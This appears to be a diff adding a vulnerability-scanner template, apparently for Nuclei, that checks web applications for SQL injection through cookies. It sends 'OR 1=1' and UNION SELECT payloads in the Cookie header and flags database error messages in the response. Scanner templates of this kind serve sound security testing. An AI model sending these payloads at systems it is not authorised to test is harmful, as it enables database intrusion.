@@ -1,0 +1,24 @@
+id: whai-sqli-cookie-injection
+
+info:
+  name: SQL Injection via Cookie
+  author: whitehat-ai
+  severity: critical
+  description: Tests SQL injection through cookie values
+  tags: sqli,cookie,injection,critical
+  classification:
+    cwe-id: CWE-89
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Cookie: "session=1' OR '1'='1; user_id=1' UNION SELECT NULL--"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(sql|syntax error|mysql|postgres|oracle)"
